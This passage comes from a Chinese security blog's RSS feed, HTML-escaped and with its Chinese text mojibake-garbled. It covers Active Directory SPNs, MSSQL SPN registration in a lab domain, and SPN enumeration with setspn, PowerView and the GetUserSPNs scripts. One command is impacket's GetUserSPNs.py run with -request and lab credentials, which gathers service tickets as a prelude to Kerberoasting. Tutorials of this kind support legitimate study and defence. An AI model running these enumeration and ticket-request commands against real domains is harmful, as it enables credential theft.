&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŸ¥é‡&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -X
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ldapåè®®&#34;&gt;LDAPåè®®&lt;/h2&gt;
&lt;p&gt;å»æŸ¥è¯¢SPNçš„æ—¶å€™ï¼Œéƒ½ä¼šç”¨åˆ°ä¸€ä¸ªåè®®ï¼Œå«åšLDAPï¼ˆLightweightDirectory Access Protocolï¼‰ï¼Œä¸­æ–‡åä¸ºè½»é‡ç›®å½•è®¿é—®åè®®ã€‚æ˜¯ä¸€ç§ç”¨æ¥æŸ¥è¯¢ä¸æ›´æ–° Active Directory çš„ç›®å½•æœåŠ¡é€šä¿¡åè®®ã€‚AD åŸŸæœåŠ¡åˆ©ç”¨ LDAP å‘½åè·¯å¾„ï¼ˆLDAP naming pathï¼‰æ¥è¡¨ç¤ºå¯¹è±¡åœ¨ AD å†…çš„ä½ç½®ï¼Œä»¥ä¾¿ç”¨å®ƒæ¥è®¿é—® AD å†…çš„å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;LDAP æ•°æ®çš„ç»„ç»‡æ–¹å¼ï¼š&lt;/p&gt;
&lt;p&gt;æ›´ç›´è§‚çš„è¯´å¯ä»¥æŠŠ LDAP åè®®ç†è§£ä¸ºä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ï¼Œå…¶ä¸­å­˜å‚¨äº†åŸŸå†…ä¸»æœºçš„å„ç§é…ç½®ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨åŸŸæ§ä¸­é»˜è®¤å®‰è£…äº† ADSI ç¼–è¾‘å™¨ï¼Œå…¨ç§° ActiveDirectory Service Interfaces Editor (ADSI Edit)ï¼Œæ˜¯ä¸€ç§ LDAP çš„ç¼–è¾‘å™¨ï¼Œå¯ä»¥é€šè¿‡åœ¨åŸŸæ§ä¸­è¿è¡Œ &lt;code&gt;adsiedit.msc &lt;/code&gt;æ¥æ‰“å¼€ï¼ˆæœåŠ¡å™¨ä¸Šéƒ½æœ‰ï¼Œä½†æ˜¯åªæœ‰åŸŸæ§ä¸­çš„æœ‰æ•´ä¸ªåŸŸå†…çš„é…ç½®ä¿¡æ¯ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€šè¿‡ adsiedit.msc æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å’Œç¼–è¾‘ LADPï¼Œåœ¨ SPN æŸ¥è¯¢æ—¶å®é™…ä¸Šå°±æ˜¯æŸ¥è¯¢ LADP ä¸­å­˜å‚¨çš„å†…å®¹ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LDAPé»˜è®¤æ˜¯ç›‘å¬åœ¨DCçš„389ç«¯å£&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä½¿ç”¨WiresharkæŠ“æ³¢ldapåè®®çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x02-mssqlæ³¨å†Œspnå®è·µ&#34;&gt;0x02 MSSQLæ³¨å†ŒSPNå®è·µ&lt;/h1&gt;
&lt;h2 id=&#34;ç¯å¢ƒ&#34;&gt;ç¯å¢ƒ&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ä¸»æœºåç§°&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;IPåœ°å€&lt;/th&gt;
&lt;th&gt;æ‰€åœ¨åŸŸ&lt;/th&gt;
&lt;th&gt;ä½œç”¨&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;DC&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.106&lt;/td&gt;
&lt;td&gt;hack.lab&lt;/td&gt;
&lt;td&gt;æä¾›SPNæœåŠ¡å’Œkerberosè®¤è¯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.111&lt;/td&gt;
&lt;td&gt;hack.lab&lt;/td&gt;
&lt;td&gt;æä¾›SQL ServeræœåŠ¡&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WIN7A&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.105&lt;/td&gt;
&lt;td&gt;hack.lab&lt;/td&gt;
&lt;td&gt;ä½¿ç”¨åŸŸç”¨æˆ·ç™»å½•SQLä¸»æœºçš„SQL ServeræœåŠ¡&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;åœ¨ä¸»æœºSQLï¼ˆ172.16.0.111ï¼‰ä¸Šå®‰è£…SQL Server 2019 Express ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å…ˆå»å®˜ç½‘ä¸‹è½½ï¼š&lt;a href=&#34;https://go.microsoft.com/fwlink/?linkid=866658&#34;&gt;ç«‹å³ä¸‹è½½ &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¿˜è¦å»å®‰è£…ä¸€ä¸ªSQLç®¡ç†å·¥å…·ï¼š&lt;a href=&#34;https://aka.ms/ssmsfullsetup&#34;&gt; SQL Server Management Studio (SSMS)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å…·ä½“å®‰è£…æ­¥éª¤åœ¨æ­¤å°±ä¸å†è®²è¿°ï¼Œå¯ä»¥å‚è€ƒç½‘ä¸Šçš„æ–‡ç« ï¼š&lt;a href=&#34;https://blog.csdn.net/CHQC388/article/details/104550963&#34;&gt;SQL Server 2019 å®‰è£…æ•™ç¨‹&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæƒ³åœ¨IISä¸Šæ³¨å†ŒSPNå¯ä»¥å‚è€ƒæ–‡ç« ï¼š&lt;a href=&#34;https://blog.csdn.net/qq_26886929/article/details/55058264?spm=1001.2014.3001.5502&#34;&gt;IIS å¼€å¯ Kerberos è®¤è¯&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ³¨å†Œspn&#34;&gt;æ³¨å†ŒSPN&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨å®‰è£…å®ŒSQL Serverçš„æ—¶å€™å·²ç»åœ¨SPNä¸­è‡ªåŠ¨æ³¨å†Œäº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯å› ä¸ºåœ¨å®‰è£…çš„æ—¶å€™æ˜¯é»˜è®¤ä½¿ç”¨Network Serviceæ¥å¯åŠ¨æœåŠ¡ï¼Œå†…ç½®è´¦æˆ·Network Serviceå’ŒLocal Systemä»£è¡¨è®¡ç®—æœºæœ¬èº«ï¼ŒSPNéœ€è¦æ³¨å†Œåœ¨è¿è¡ŒSQL Serverçš„è®¡ç®—æœºè´¦æˆ·ä¸‹ã€‚ä½†Network Serviceå’ŒLocal System&lt;strong&gt;æœ¬èº«æœ‰æƒé™ä¸ºæœ¬æœºæ³¨å†Œå’Œåˆ é™¤SPN&lt;/strong&gt;ï¼Œä¸€èˆ¬æƒ…å†µä¸éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Local Systemæƒé™è¿‡å¤§ï¼Œä¸æ¨èä½¿ç”¨åšæœåŠ¡å¯åŠ¨è´¦æˆ·&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬è¦å¼€å¯è¿œç¨‹è¿æ¥ï¼Œæ‰“å¼€é…ç½®ç®¡ç†å™¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨ç½‘ç»œé…ç½®é‡Œé¢å¯ç”¨TCP/IPï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;å®Œæˆä¸Šé¢çš„è¿œç¨‹è®¿é—®é…ç½®æˆ‘ä»¬å¼€å§‹ä»WIN7Aä¸»æœºè¿æ¥SQLä¸»æœºçš„SQL SeveræœåŠ¡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç™»å½•ä¹‹åæˆ‘ä»¬å¯ä»¥åœ¨SQLä¸»æœºç”¨saæˆ–è€…æ˜¯åŸŸç®¡ç†ç”¨æˆ·å»æŸ¥è¯¢è¯¥è¿æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dm_exec_connections&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶è€Œæˆ‘ä»¬ä¸€èˆ¬æ˜¯ä¼šä½¿ç”¨åŸŸç”¨æˆ·å»æ³¨å†ŒSPNçš„MSSQLæœåŠ¡ï¼Œæˆ‘ä»¬é¦–å…ˆè¦åœ¨MSSQLçš„é…ç½®å™¨ä¸­ä¿®æ”¹æˆåŸŸç”¨æˆ·ï¼Œå› ä¸ºæˆ‘ä»¬çš„Kerberoastingæ”»å‡»å°±è¦ç”¨åˆ°è¿™ä¸€å—çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹å®Œåæˆ‘ä»¬å†ä»WIN7Aä¸»æœºè¿›è¡Œç™»å½•ï¼Œå‘ç°æŠ¥é”™äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The target principal name is incorrect.  Cannot generate SSPI context
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼Œå› ä¸ºæˆ‘ä»¬ä¸€å¼€å§‹å®‰è£…SQL Serverçš„æ—¶å€™æ˜¯è‡ªåŠ¨ä½¿ç”¨æœºå™¨ç”¨æˆ·æ³¨å†Œåœ¨SPNä¸Šçš„ï¼Œè€Œä¸”ç°åœ¨æˆ‘ä»¬é€‰æ‹©çš„è¿™ä¸ªtestsqlç”¨æˆ·æ²¡æœ‰æƒé™å»æ³¨å†ŒSPNï¼Œæ‰€ä»¥å°±ä¼šå¯¼è‡´è¿›è¡Œç™»å½•çš„æ—¶å€™å»æŸ¥è¯¢SPNå‘ç°testsqlç”¨æˆ·ä¸‹æ²¡æœ‰æ³¨å†Œã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬éœ€è¦æ­£ç¡®å»é…ç½®SPNï¼Œæˆ‘è¿™é‡Œæ˜¯åˆ©ç”¨åŸŸç®¡çš„è´¦æˆ·è¿›è¡Œæ“ä½œï¼Œé¦–å…ˆæ˜¯æ·»åŠ æ­£ç¡®çš„SPNï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -S MSSQLSvc/SQL.hack.lab:1433 testsql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -S MSSQLSvc/SQL.hack.lab testsql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†æŸ¥è¯¢ä¸€ä¸‹SPNè®°å½•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -L testsql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬é‡æ–°å»ä½¿ç”¨WIN7Aä¸»æœºè¿›è¡Œç™»å½•ï¼Œå‘ç°æˆåŠŸç™»å½•äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœå‘ç°æ€»æ˜¯å‡ºç°é”™è¯¯å¯ä»¥ä½¿ç”¨å¾®è½¯çš„Kerberos Configuration Manager for SQL Serverçš„å·¥å…·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-ca/download/details.aspx?id=39046&#34;&gt;https://www.microsoft.com/en-ca/download/details.aspx?id=39046&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½å®‰è£…åè¦åœ¨ç›®å½•æ‰å¯ä»¥æ‰¾åˆ°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/24.png&#34; alt=&#34;24&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€åç›´æ¥ç‚¹connectå³å¯ï¼Œä¸ç”¨è¾“å…¥ä»»ä½•ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/25.png&#34; alt=&#34;25&#34;&gt;&lt;/p&gt;
&lt;p&gt;å®ƒä¼šæ˜¾ç¤ºå‡ºæˆ‘ä»¬é‚£äº›å‡ºç°äº†é”™è¯¯ï¼Œç‚¹å‡»æ—è¾¹çš„fixå³å¯ä¿®å¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/26.png&#34; alt=&#34;26&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…·ä½“å¯ä»¥å‚è€ƒæ–‡ç« ï¼š&lt;a href=&#34;https://www.mssqltips.com/sqlservertip/6772/kerberos-configuration-manager-for-sql-server/&#34;&gt;Using Kerberos Configuration Manager for SPNs Validation&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;èµ‹äºˆæ™®é€šåŸŸç”¨æˆ·è¯»å†™spnæƒé™&#34;&gt;èµ‹äºˆæ™®é€šåŸŸç”¨æˆ·è¯»å†™SPNæƒé™&lt;/h2&gt;
&lt;p&gt;å¦‚æœæƒé™ä¸å¤Ÿæ‰§è¡Œæ³¨å†ŒSPNä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/19.png&#34; alt=&#34;19&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç”±äºæˆ‘ä»¬ä¸Šé¢è¯´åˆ°å› ä¸ºä½¿ç”¨testsqlåŸŸç”¨æˆ·æ¥å¯åŠ¨SQL ServeræœåŠ¡æ²¡æœ‰æƒé™æ³¨å†ŒSPNï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ™®é€šçš„åŸŸç”¨æˆ·æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸‹é¢çš„æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ADSI ç¼–è¾‘å™¨ï¼ˆadsiedit.mscï¼‰ä¸­ï¼Œé€‰æ‹©testsqlç”¨æˆ·ï¼Œç„¶åç‚¹å‡»ä¸‹é¢çš„&lt;code&gt;é«˜çº§&lt;/code&gt;æŒ‰é’®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¼¹å‡ºé«˜çº§å®‰å…¨è®¾ç½®åç‚¹å‡»ä¸‹é¢çš„&lt;code&gt;æ·»åŠ &lt;/code&gt;æŒ‰é’®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä¸»ä½“ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©SELFï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¡®å®šåï¼Œæˆ‘ä»¬åœ¨ä¸‹é¢çš„è¿™ä¸¤é¡¹æ‰“å‹¾å³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/17.png&#34; alt=&#34;17&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬åŸŸç”¨æˆ·testsqlå°±æœ‰æƒé™å»æ³¨å†ŒSPNäº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x03-æ‰«æspn&#34;&gt;0x03 æ‰«æSPN&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬é™¤äº†å¯ä»¥ä½¿ç”¨SetSPNä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„ä¸€äº›è„šæœ¬è¿›è¡ŒæŸ¥è¯¢ã€‚&lt;/p&gt;
&lt;h2 id=&#34;powerview&#34;&gt;PowerView&lt;/h2&gt;
&lt;p&gt;PowerViewæ˜¯ PowerSpolit ä¸­ Reconç›®å½•ä¸‹çš„ä¸€ä¸ªpowershellè„šæœ¬PowerView ç›¸å¯¹äºä¸Šé¢å‡ ç§æ˜¯æ ¹æ®ä¸åŒç”¨æˆ·çš„ objectsid è¿”å›çš„ä¿¡æ¯æ›´åŠ è¯¦ç»†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PowerView&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-NetUser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-SPN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/20.png&#34; alt=&#34;20&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;getuserspnsvbs&#34;&gt;GetUserSPNs.vbs&lt;/h2&gt;
&lt;p&gt;GetUserSPNs æ˜¯ Kerberoast å·¥å…·é›†ä¸­çš„ä¸€ä¸ª vbs è„šæœ¬ç”¨æ¥æŸ¥è¯¢åŸŸå†…ç”¨æˆ·æ³¨å†Œçš„ SPNã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼šhttps://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œå‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cscript ./GetUserSPNs.vbs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/21.png&#34; alt=&#34;21&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;getuserspnsps1&#34;&gt;GetUserSPNs.ps1&lt;/h2&gt;
&lt;p&gt;GetUserSPNs æ˜¯ Kerberoast å·¥å…·é›†ä¸­çš„ä¸€ä¸ª powershell è„šæœ¬ç”¨æ¥æŸ¥è¯¢åŸŸå†…ç”¨æˆ·æ³¨å†Œçš„ SPNã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼šhttps://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œå‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module .\GetUserSPNs.ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/22.png&#34; alt=&#34;22&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;getuserspnspy&#34;&gt;GetUserSPNs.py&lt;/h2&gt;
&lt;p&gt;GetUserSPNs.pyæ˜¯&lt;strong&gt;impacket&lt;/strong&gt;å·¥å…·åŒ…çš„ä¸€æ¬¾å·¥å…·ï¼Œè¯¥å·¥å…·åŒ…ç”¨äºå¯¹SMB1-3æˆ–IPv4 / IPv6 ä¸Šçš„TCPã€UDPã€ICMPã€IGMPï¼ŒARPï¼ŒIPv4ï¼ŒIPv6ï¼ŒSMBï¼ŒMSRPCï¼ŒNTLMï¼ŒKerberosï¼ŒWMIï¼ŒLDAPç­‰åè®®è¿›è¡Œä½çº§ç¼–ç¨‹è®¿é—®ï¼Œå¯ä½¿ç”¨è¯¥å·¥å…·å¯¹ç›®æ ‡ä¸»æœºè¿›è¡ŒSPNæ¢æµ‹ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…åœ°å€ï¼šhttps://github.com/SecureAuthCorp/impacket&lt;/p&gt;
&lt;p&gt;è¯¥å·¥å…·åœ¨æœ€æ–°ç‰ˆæœ¬çš„kaliæ˜¯å†…ç½®çš„ï¼Œç›´æ¥è¿è¡Œå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GetUserSPNs.py hack.lab/lucky:p@ssw0rd -dc-ip 172.16.0.106 -request
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/23.png&#34; alt=&#34;23&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶è¿™æ¬¾å·¥å…·ä¹Ÿåˆ©ç”¨äºKerberoastingçš„æ”»å‡»ï¼ŒKerberoastingåœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« ä¸­è®²åˆ°ï¼š&lt;/p&gt;
&lt;h1 id=&#34;0x04-å‚è€ƒ&#34;&gt;0x04 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.modb.pro/db/62849&#34;&gt;https://www.modb.pro/db/62849&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/system/196434.html&#34;&gt;https://www.freebuf.com/articles/system/196434.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://chowdera.com/2021/12/20211201194023144R.html&#34;&gt;https://chowdera.com/2021/12/20211201194023144R.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://f5.pm/go-8673.html&#34;&gt;http://f5.pm/go-8673.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/219934&#34;&gt;https://www.anquanke.com/post/id/219934&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/zpchcbd/p/11707776.html&#34;&gt;https://www.cnblogs.com/zpchcbd/p/11707776.html&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-Kerberoasting</title>
      <link>https://xxe.icu/ad_kerberoasting.html</link>
      <pubDate>Sat, 26 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ad_kerberoasting.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
